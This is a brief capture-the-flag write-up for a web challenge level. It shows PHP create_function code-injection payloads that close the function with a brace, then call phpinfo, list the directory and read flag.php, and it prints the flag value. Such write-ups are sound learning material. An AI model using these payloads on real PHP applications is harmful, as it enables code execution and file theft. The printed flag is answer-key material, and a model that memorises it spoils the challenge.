### Level15
Googling 'create_function exploit' gives us [this exploit](https://www.exploitalert.com/view-details.html?id=10264), which I initially had trouble using until I figured you could just use `}`. From there, `}phpinfo(); //` works fine.

`}print_r(scandir("./")); //` gives us the info that 'flag.php' is right here.
`}print_r(readfile("flag.php")); //` gives us the flag.

Flag is `WEBSEC{HHVM_was_right_about_not_implementing_eval}`
    
